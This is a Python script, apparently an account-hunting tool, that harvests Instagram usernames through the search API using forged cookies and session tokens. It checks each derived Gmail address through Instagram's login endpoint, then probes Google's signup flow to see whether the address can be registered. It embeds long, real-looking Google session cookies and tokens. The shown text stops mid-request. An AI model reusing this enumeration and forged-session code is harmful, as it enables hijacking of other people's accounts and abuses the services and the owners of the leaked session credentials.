import requests
import random
import threading
import time
import json
import os
from faker import Faker
import secrets
import pyfiglet
import string
from OneClick import Hunter
import uuid
from uuid import uuid4
from user_agent import generate_user_agent
############################
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
C1 = '\033[2;35m'
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
L = "\033[1;95m"  #ارجواني
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فات
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
L = "\033[1;95m"  #ارجواني
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فات
lll = '\033[7;100m'#رصاصي جديدة
rrr = '\033[7;101m'#احمر جديد
ggg = '\033[7;102m'#اخضر جديدة
yyy = '\033[7;103m'#اصفر جديدة
bbb = '\033[7;104m' #ازرق جديدة
ppp = '\033[7;105m' #بنفسجي جديدة
mmm = '\033[7;106m' #سمائي جديدة
aaa = '\033[7;107m' #ابيض جديدة
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
y = '\033[1;35m'#وردي
f = '\033[2;35m'#بنفسجي
z = '\033[3;33m'#اصفر طوخ
G = '\033[2;36m'
E = '\033[1;31m'
V = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
O = '\x1b[38;5;208m' #برتقالي
BL = '\x1b[38;5;21m' #ازاق طوخ
YU = '\x1b[38;5;200m' #وردي طوخ
#################################

logo=pyfiglet.figlet_format('TOOLS')
print(kk+logo)
def h():
   #sessi='318506585%3ACVqw0bbsyimqSY%3A7%3AAYc_Nfk3SCTLr1vnJW9ueTXVuaOVojaDNP-ikecVHA'
   while True:
    #hh = [
    #"ar_AA", "ar_AE", "ar_BH", "ar_EG", "ar_JO", "ar_PS", "ar_SA", "az_AZ",
    #"bg_BG", "bn_BD", "bs_BA", "cs_CZ", "da_DK", "de", "de_AT", "de_CH", "de_DE",
    #"dk_DK", "el_CY", "el_GR", "en", "en_AU", "en_CA", "en_GB", "en_IE", "en_IN",
    #"en_NZ", "en_PH", "en_TH", "en_US", "es", "es_AR", "es_CA", "es_CL", "es_CO",
    #"es_ES", "es_MX", "et_EE", "fa_IR", "fi_FI", "fil_PH", "fr_BE", "fr_CA", "fr_CH",
    #"fr_FR", "ga_IE", "he_IL", "hi_IN", "hr_HR", "hu_HU", "hy_AM", "id_ID",
    #"it_CH", "it_IT", "ja_JP", "ka_GE", "ko_KR", "la", "lb_LU", "lt_LT", "lv_LV",
    #"mt_MT", "ne_NP", "nl_BE", "nl_NL", "no_NO", "or_IN", "pl_PL", "pt_BR", "pt_PT",
    #"ro_RO", "ru_RU", "sk_SK", "sl_SI", "sq_AL", "sv_SE", "ta_IN", "th", "th_TH",
    #"tl_PH", "tr_TR", "tw_GH", "uk_UA", "vi_VN", "zh_CN", "zh_TW", "zu_ZA"
   #]
    #gg=random.choice(hh)
    faker = Faker()
    cookies_value=faker.uuid4()
    cookies_string=f"{cookies_value}"
    #mid=str("".join(random.choice('ZNS8TAABAAGIluu5GdRKW7-kOo4vZIwIGQALAAFJh0hs0zugnqEWswdVZNOoBQALAAGNtLzGeFVzHXDZTR_3')for i in range(28)))
    #mid = secrets.token_hex(28)
    characters = string.ascii_letters + string.digits
    mid = ''.join(secrets.choice(characters) for _ in range(28))
    #csr=str("".join(random.choice('BgqHBezVdVLIwiiK2vnQoMeHfwDnEDdy4ev2UhLwIvaMMmcTnIPLlnYe9eKIrk6h')for i in range(32)))
    characters = string.ascii_letters + string.digits
    csrf_token = ''.join(secrets.choice(characters) for _ in range(32))
    #datr=str("".join(random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890')for i in range(24)))
    #tok=str("".join(random.choice('BgqHBezVdVLIwiiK2vnQoMeHfwDnEDdy4ev2UhLwIvaMMmcTnIPLlnYe9eKIrk6hIchbyeD2EMfxlXtEidhVb473sX2nACJi')for i in range(32)))
    #ce="".join(random.choice('1234567890')for i in range(3))
    #nn="".join(random.choice('1234567890')for i in range(2))
    #user1='3185065856117232390916041093751954736743761365466232234569147861383944408'
    #kk = random.randint(10,11)
    #user2="".join(random.choice(user1)for i in range(kk))
    digits = string.digits
# توليد الرقم العشوائي
    user2 = ''.join(secrets.choice(digits) for _ in range(10))
    #yy='3ACVqw0bbsyimqSY%3A7%3AAYc_Nfk3SCTLr1vnJW9ueTXVuaOVojaDNP-ikecVHA%3AwsGfd6prEwVhQi%3A9%3AAYc2pc3P-nMx-khlBp4mOvkT39Zj7G6UXWn3CSXKag3Av36lq83bB4QMSG%3A28%3AAYeb3SKZK1ftXI_IOeqbkTLg1N_ve1vxmLkQ2qc05A3AyvYh8ztbg9qPOl%3A5%3AAYetGkds5jo18ck0uZW3I_tmj1dqk3Q9YRUrSaIYsQ3AOKLDLNPsHYGTJl%3A0%3AAYeYbOklyVCesUBg0pE2scMTw8RgelDdx4eVIQ_2hQ3AZvWuI0EbY8PXmw%3A2%3AAYexLLuc7bASBuyVWaAZuEy6qmu0f8XAnkZkgxyrIw3A3hbzW3nBjg5gXG%3A25%3AAYcyM6J_IhqRi2bFV1II17_FkjtAMjB0KXQ5Q0Khvw3AsyVlIj4ZDzyRPO%3A5%3AAYfGLAn2jh_fwDsnJupuDgVG2BBWgWiyjdH5fTi5Fw3A0zNy29n3aeW9ZI%3A16%3AAYe5NkWjqegZ_pMAlrXO_zbFTfnYdswA3I-CnKwd4w3ANhynbbv9oTPItn%3A11%3AAYfHL92Yand7PNHZfGZwHE3_PF89j5Rk0cxgTfrU8g3AOrDDBg3KyjB4Z4%3A27%3AAYcEUTo5aCtRrJSyN72i58IY5hJQLXQ_A8_QBuZPWQ3AvJYrEgtUCt5sgo%3A7%3AAYeFzP4zJ_5DPtyvbtmLARpmKt-8_2a4a0D07KNqUA3APjfLNuNjfj7z6u%3A25%3AAYfPNAz2A6IGXdKjqNg-Ge7NbJ1Y_ep6njcF2NlK5w3A2WIqaZiNrLBelY%3A27%3AAYfpoMf8AULuX7BmZnbAlFbKbtKz5yIRAM1QRCByWQ3AKg6IycgpKB3eVJ%3A3%3AAYfgX0TQlpmYSR6ba0ZpTlqa_q0usCySLjChjll8HA3Ary8aErh01bE1xe%3A6%3AAYc4UV_sJxv6VUev-U695nwzv_wWP49-z_x9pV7eTQ'
    #us="".join(random.choice(yy)for i in range(16))
    characters = string.ascii_letters + string.digits
    qtt = '%'
# توليد السلسلة العشوائية
    us = ''.join(secrets.choice(characters) for _ in range(16))
    vcc= '%'
    loo='3A9'
    zxe='%'
    ui='3AA'
    #nbp= 'cEUTo5aCtRrJSyN72i58IY5hJQLXQ_A8_QBuZPWQeFzP4zJ_5DPtyvbtmLARpmKt-8_2a4a0D07KNqUAfHL92Yand7PNHZfGZwHE3_PF89j5Rk0cxgTfrU8ge5NkWjqegZ_pMAlrXO_zbFTfnYdswA3I-CnKwd4w'
    #sqq=''.join(random.choice(nbp)for i in range(40))
    characters = string.ascii_letters + string.digits
# توليد السلسلة العشوائية
    session_id = ''.join(secrets.choice(characters) for _ in range(41))
    user3=user2 + qtt + us + vcc + loo + zxe + ui + session_id
    digits = string.digits
# توليد الرقم العشوائي
    ds = ''.join(secrets.choice(digits) for _ in range(11))
    agent=faker.user_agent()
    nm = int("".join(random.choice('6789')for i in range(1)))
    vm = str("".join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnm')for i in range(nm)))
    digits = string.digits
# توليد الرقم العشوائي
    #ur = ''.join(secrets.choice(digits) for _ in range(15))
    digits = string.digits
# توليد الرقم العشوائي
    fbm = ''.join(secrets.choice(digits) for _ in range(15))
    characters = string.ascii_letters + string.digits
    shbid = ''.join(secrets.choice(characters) for _ in range(72))
    #characters = string.ascii_letters + string.digits
    #fbsr = ''.join(secrets.choice(characters) for _ in range(300))
    #characters = string.ascii_letters + string.digits
    #fbs = ''.join(secrets.choice(characters) for _ in range(25))
    #characters = string.ascii_letters + string.digits
    #fns = ''.join(secrets.choice(characters) for _ in range(11))
    #characters = string.ascii_letters + string.digits
    #ggf = ''.join(secrets.choice(characters) for _ in range(5))
    characters = string.ascii_letters + string.digits
    claim = ''.join(secrets.choice(characters) for _ in range(48))
    digits = string.digits
# توليد الرقم العشوائي
    app = ''.join(secrets.choice(digits) for _ in range(15))
    digits = string.digits
# توليد الرقم العشوائي
    asd = ''.join(secrets.choice(digits) for _ in range(6))
    url = f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&include_reel=true&query={vm}'
    headers={
        'x-requested-with': 'XMLHttpRequest',
        'x-ig-www-claim': f'hmac.{claim}',
        'x-ig-app-id': f'{app}',
        'x-csrftoken': csrf_token,
        'x-asbd-id': f'{asd}',
        'user-agent': agent,
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'referer': 'https://www.instagram.com/explore/search/',
        'cookie': f'ig_nrcb=1; mid={mid}ig_did={cookies_string}; fbm_{fbm}=base_domain=.instagram.com; csrftoken={csrf_token}; ds_user_id=' + ds + '; sessionid=' + user3+ f'; shbid="11206,{ds},{ds}:{shbid}"; shbts="{ds},{ds},{ds}:{shbid}";fbsr_{fbm}={cookies_string}; rur="CLN,{ds},{ds}:{shbid}"',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'accept': '*/*'
        }
    re =requests.get(url,headers=headers).json()
    q=0
    try:
        while True:
            q+=1     
            user=re['users'][q]['user']['username']+'@gmail.com'
            print(f'{X}User :-> {user}')
            with open("list_TEST.txt","a")as no:
                no.write(user+'\n')
    except:
        h()

def inst():
    try:
        ID = input(Y+' Give me Id Telegram : '+F)
        os.system('clear')
        Token = input(X+' Give me Token Bot : '+F)
        file = open("INSTAGRAMV3.txt","r").read().splitlines()
        for email in file:
            url='https://i.instagram.com/api/v1/accounts/login/'
            hd = str(Hunter.Services())
            headers = {'User-Agent':hd,  'Accept':'*/*',
                     'Cookie':'missing',
                     'Accept-Encoding':'gzip, deflate',
                     'Accept-Language':'en-US',
                     'X-IG-Capabilities':'3brTvw==',
                     'X-IG-Connection-Type':'WIFI',
                     'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                  'Host':'i.instagram.com'}
            uid = uuid4()
            data = {'uuid':uid,  'password':'hSn1122',
                  'username':email,
                  'device_id':uid,
                  'from_reg':'false',
                  '_csrftoken':'missing',
                  'login_attempt_countn':'0'}
            req= requests.post(url, headers=headers, data=data).json()
            if req['message'] == 'The password you entered is incorrect. Please try again.':
                print(f'{F}Hit Account {Y}InstaGram : {F}{email}')
                url1 = 'https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=82313&rt=j'

                headers1 = {
                'Accept':'*/*',
                'Accept-Encoding':'gzip, deflate, br',
                'Accept-Language':'ar,en-US;q=0.9,en;q=0.8,pt;q=0.7',
                'Content-Length':'2012',
                'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
                'Cookie':'HSID=AKns6WEN7Wob5S0PL; SSID=AzqTxPQlZ0AkkU5Rj; APISID=9BN4pfxrUMbjkV0y/A9RAWK6baRAEWup7C; SAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-1PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-3PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; ACCOUNT_CHOOSER=AFx_qI4i4F-SJeNXimyuT1TsLzQGoirwEMQbDTUSf8_qRJiH3VvA80439gS5xk0yfLievE4F3Y0vLwBzA0RQTcPYn1_dd3X2622sgrALE9OQtvqRpE3NxSH8dvV5WyUDY8nRlHYEuXzz; SEARCH_SAMESITE=CgQI-pgB; SID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7wTyFvfWk6B5sPxW_FaoYEQ.; __Secure-1PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ710TXG4Jt_bjbBwdKebi3pw.; __Secure-3PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7TQf-K0pmaViWQPPDdPTgRg.; LSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZAfn5WR6msbm-dkQzgpJbog.; __Host-1PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZaDY2Dsx7Ecs20HT5d52b5g.; __Host-3PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZFTXp5-IXaSFzxYb7CQkjjA.; AEC=Ackid1Sq4MbYErBR_Us0tf9WFDtcuwvzHrRH5Yve8rLOlw_RSIjKFLIBTA; OTZ=7221341_44_44__44_; NID=511=eWtVDIf4hG2j9mDnnIa4x5w78Y1yjEI0iSl9YxtW0mSdgNSmGdueFUSz5v9DVu7QXaEFzSzL4ajsSVYBKNOJ1ansnWB5Zfw3-9flbVP-Q_9oVAbjlwZLdFyrG24gyA3QScjCb_o5K1_31NsxTUmgb3PtC_mgJhjN8-I1ntb4ZPSzOdfMoJhlfgS3rrXhnsW9y9OXmV_5LeWtTWbUapV6Hqi54nNF-A973IJNQ3vjHT96YO9BzD7vAF0Fz4QJCR5yrAdtTL9CODRVXJDa0D7BcrUzwuD3BHtSeICl4ucMO80itXie8oMydXNhFEzBicC65MZ_3zyxfhY; __Secure-1PSIDTS=sidts-CjIB3e41hQlx-Wv4BiGfmjzJuQ98u0cICR1fDu4PFy8f3ICss2VVW2DOOCWtxRVJZxOc7RAA; __Secure-3PSIDTS=sidts-CjIB3e41hQlx-Wv4BiGfmjzJuQ98u0cICR1fDu4PFy8f3ICss2VVW2DOOCWtxRVJZxOc7RAA; 1P_JAR=2023-9-24-19; __Host-GAPS=1:iFhDk8pCf_rD1y3_iK2rTNHPPXyeFdUNSUjVgFZCL3Ltep11xrrj3uMllHFN7PihHvMGMTJMk7wzsbxtkkxqQ_UwnvxmvQ:vzp7p_rGftukpa7K; SIDCC=APoG2W89V3Dj40h3I70mlxHqCsOnBqi1Y1IrqdrZ28s11C3oE9Cgl3AFna_0iqMulMurcnIZUAI; __Secure-1PSIDCC=APoG2W-pHOrjlyneewhmwgzwCclUzrXhQKOfz0m4R3IyzCDXjIeFlwOQibw94fcCWMCApPTYxlc; __Secure-3PSIDCC=APoG2W8sda3Sda4T54ef6cME8uLFklJ3FfAkNIEevAOou3ZHau6ityTVjk9n4Bb7qiCEFhiNyw',
                'Google-Accounts-Xsrf':'1',
                'Origin':'https://accounts.google.com',
                'Referer':'https://accounts.google.com/signup/v2/createaccount?theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp',
                'Sec-Ch-Ua':'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
                'Sec-Ch-Ua-Arch':'"x86"',
                'Sec-Ch-Ua-Bitness':'"64"',
                'Sec-Ch-Ua-Full-Version':'"116.0.5845.188"',
                'Sec-Ch-Ua-Full-Version-List':'"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"',
                'Sec-Ch-Ua-Mobile':'?0',
                'Sec-Ch-Ua-Model':'""',
                'Sec-Ch-Ua-Platform':'"Windows"',
                'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
                'Sec-Ch-Ua-Wow64':'?0',
                'Sec-Fetch-Dest':'empty',
                'Sec-Fetch-Mode':'cors',
                'Sec-Fetch-Site':'same-origin',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'X-Chrome-Id-Consistency-Request':'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=b20ba583-8cad-46a7-80ea-88e6755866ad,sync_account_id=105342098533404169783,signin_mode=all_accounts,signout_mode=show_confirmation',
                'X-Client-Data':'CIe2yQEIpbbJAQipncoBCMzfygEIlKHLAQiFoM0BCI2yzQEI3L3NAQjfxM0BCOnFzQEIucrNAQjV0M0BCJHSzQEIitPNAQj5wNQVGPXJzQE=',
                'X-Same-Domain':'1'
                }
                data1 = {
                'theme': 'glif',
                'continue': 'https://accounts.google.com/ManageAccount?nc=1',
                'f.req': '["AEThLlzavccs_MdaDMBDfSU7NEeTKr02URa8Y9GAk-2d5ygvEJv1okzAOPzpFw_rFw7MwSmg0m4SxVvZNNMz97nf2-NlwAlseWtZSAdlgAwoVzJaYtv-tuezCMXj8lHpLGDJbv2PEVTDn47o79z30klv1McaYIuuIW8xRVelt4tQ3jbscrpSkCTv7cT5a5A3FvaQISHBljEF",null,null,null,null,0,0,"strrgrs","strrgrs","web-glif-signup",0,null,10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],1]',
                'at': 'AFoagUUzkiOnQaoRtzNNCpQ0ha9o8tIkSQ:1695585059018',
                'azt': 'AFoagUUi89PpEd8CL8NrG88__muZtPuD_w:1695585059018',
                'cookiesDisabled': 'false',
                'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
                'gmscoreversion': 'undefined',
                'flowName': 'GlifWebSignIn',
                'checkConnection': 'youtube:290:0',
                'checkedDomains': 'youtube',
                'pstMsg': '1',
                }

                re = requests.post(url1,headers=headers1,data=data1).text
                TLL = re.split('["gf.ttu",null,"')[1].split('"],')[0]

                url2 = ('https://accounts.google.com/_/signup/validatebasicinfo?hl=ar&TL=AJeL0C43qObZzGhdyZTfL_-PeEXerBAQ8r6OB8Tq1uhlCyJ0Y-WKaVwPFuDvjohv&_reqid=283689&rt=j')

                headers2 = {
                'Accept':'*/*',
                'Accept-Encoding':'gzip, deflate, br',
                'Accept-Language':'ar,en-US;q=0.9,en;q=0.8,pt;q=0.7',
                'Content-Length':'1243',
                'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
                'Cookie':'HSID=AKns6WEN7Wob5S0PL; SSID=AzqTxPQlZ0AkkU5Rj; APISID=9BN4pfxrUMbjkV0y/A9RAWK6baRAEWup7C; SAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-1PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; __Secure-3PAPISID=lz5nEQDQLnmDsQP6/AoooG1y3D_wh-NSKu; ACCOUNT_CHOOSER=AFx_qI4i4F-SJeNXimyuT1TsLzQGoirwEMQbDTUSf8_qRJiH3VvA80439gS5xk0yfLievE4F3Y0vLwBzA0RQTcPYn1_dd3X2622sgrALE9OQtvqRpE3NxSH8dvV5WyUDY8nRlHYEuXzz; SEARCH_SAMESITE=CgQI-pgB; SID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7wTyFvfWk6B5sPxW_FaoYEQ.; __Secure-1PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ710TXG4Jt_bjbBwdKebi3pw.; __Secure-3PSID=awittPRSDweLi6wc_iKDv_gb-Im6jSFWio6J4dKr0PlwceJ7TQf-K0pmaViWQPPDdPTgRg.; LSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZAfn5WR6msbm-dkQzgpJbog.; __Host-1PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZaDY2Dsx7Ecs20HT5d52b5g.; __Host-3PLSID=o.admin.google.com|o.groups.google.com|o.mail.google.com|o.myaccount.google.com|o.play.google.com|s.GB|s.IQ|s.youtube:awittO8lNCt5XV0HIOjNHwwoenpea1aoldSvnQAaJ4M6PIZZFTXp5-IXaSFzxYb7CQkjjA.; AEC=Ackid1Sq4MbYErBR_Us0tf9WFDtcuwvzHrRH5Yve8rLOlw_RSIjKFLIBTA; OTZ=7221341_44_44__44_; NID=511=eWtVDIf4hG2j9mDnnIa4x5w78Y1yjEI0iSl9YxtW0mSdgNSmGdueFUSz5v9DVu7QXaEFzSzL4ajsSVYBKNOJ1ansnWB5Zfw3-9flbVP-Q_9oVAbjlwZLdFyrG24gyA3QScjCb_o5K1_31NsxTUmgb3PtC_mgJhjN8-I1ntb4ZPSzOdfMoJhlfgS3rrXhnsW9y9OXmV_5LeWtTWbUapV6Hqi54nNF-A973IJNQ3vjHT96YO9BzD7vAF0Fz4QJCR5yrAdtTL9CODRVXJDa0D7BcrUzwuD3BHtSeICl4ucMO80itXie8oMydXNhFEzBicC65MZ_3zyxfhY; __Secure-1PSIDTS=sidts-CjIB3e41hSBcUhP8NyqWW2ADaxGlP5fNz_9VqNVEKSaMEABFvwEhLgGZ093XkB38enu2ZRAA; __Secure-3PSIDTS=sidts-CjIB3e41hSBcUhP8NyqWW2ADaxGlP5fNz_9VqNVEKSaMEABFvwEhLgGZ093XkB38enu2ZRAA; 1P_JAR=2023-9-24-20; __Host-GAPS=1:NH4ff_ca85MbS_Oy22i-HVW9z7iTfoC9f7WpMXewN1CAIy7lv2A8Gkt1Cn3h1lGFzfpwVNpa4KbEeoNpa3f01hkIR9dV8w:ucYsdrNQRlvj2wLH; SIDCC=APoG2W_i5paMflXBUncC2H4tWKnnYlb6EN8mJavQ5QD7I6Boz_mPhgHHY5atNHEaKvXASATVAq0; __Secure-1PSIDCC=APoG2W_CSoBIIpl_-YgzWNDlpF2az6b6WUUQbUlsvAmYyDP5wN7c17Nwcrn3MGeapKh-8jf7Pc8; __Secure-3PSIDCC=APoG2W-cSJNfs98t1YDG74w8iT6WSDBWGSXUJ_FuzxeBgEaVPZxxcpMwxlY2RUMvCXd-erQ4Dw',
                'Google-Accounts-Xsrf':'1',
                'Origin':'https://accounts.google.com',
                'Referer':'https://accounts.google.com/signup/v2/birthdaygender?theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL=AJeL0C43qObZzGhdyZTfL_-PeEXerBAQ8r6OB8Tq1uhlCyJ0Y-WKaVwPFuDvjohv',
                'Sec-Ch-Ua':'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
                'Sec-Ch-Ua-Arch':'"x86"',
                'Sec-Ch-Ua-Bitness':'"64"',
                'Sec-Ch-Ua-Full-Version':'"116.0.5845.188"',
                'Sec-Ch-Ua-Full-Version-List':'"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"',
                'Sec-Ch-Ua-Mobile':'?0',
                'Sec-Ch-Ua-Model':'""',
                'Sec-Ch-Ua-Platform':'"Windows"',
                'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
                'Sec-Ch-Ua-Wow64':'?0',
                'Sec-Fetch-Dest':'empty',
                'Sec-Fetch-Mode':'cors',
                'Sec-Fetch-Site':'same-origin',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'X-Chrome-Id-Consistency-Request':'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=b20ba583-8cad-46a7-80ea-88e6755866ad,sync_account_id=105342098533404169783,signin_mode=all_accounts,signout_mode=show_confirmation',
                'X-Client-Data':'CIe2yQEIpbbJAQipncoBCMzfygEIlKHLAQiFoM0BCI2yzQEI3L3NAQjfxM0BCOnFzQEIucrNAQjV0M0BCJHSzQEIitPNAQj5wNQVGPXJzQE=',
                'X-Same-Domain':'1'
                }

                data2 = {
                'theme': 'glif',
                'continue': 'https://accounts.google.com/ManageAccount?nc=1',
                'f.req': f'["TL:{TLL}",1999,3,6,2,null,null,0,null,null,0,0]',
                'at': 'AFoagUXYUhTvUEnQe3grDoZb22BYTBUXFg:1695586462543',
                'azt': 'AFoagUWQYD1CqlgiVRQg71n710QgPsx-jA:1695586462544',
                'cookiesDisabled': 'false',
                'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
                'gmscoreversion': 'undefined',
                'flowName': 'GlifWebSignIn',
                'checkConnection': 'youtube:486:0',
                'checkedDomains': 'youtube',
                'pstMsg': '1'
                }

                re2 = requests.post(url2,headers=headers2,data=data2).text

                TLL2 = re2.split('["gf.bgvr",1,0,0,"TL:')[1].split('",null,null,0,24,null,null,0],["e",2,null,null,146]]]')[0]


                link = 'https://accounts.google.com/_/signup/usernameavailability?&rt=j'

                headers= {
                'accept':'*/*',
                'accept-encoding':'gzip, deflate',
                'accept-language':'en-US,en;q=0.8,ar;q=0.6',
                'content-length':'973',
                'content-type':'application/x-www-form-urlencoded;charset=UTF-8',
